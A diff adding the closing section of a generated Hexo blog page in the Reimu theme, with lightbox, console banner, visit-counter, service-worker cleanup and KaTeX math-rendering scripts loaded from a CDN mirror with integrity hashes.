+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
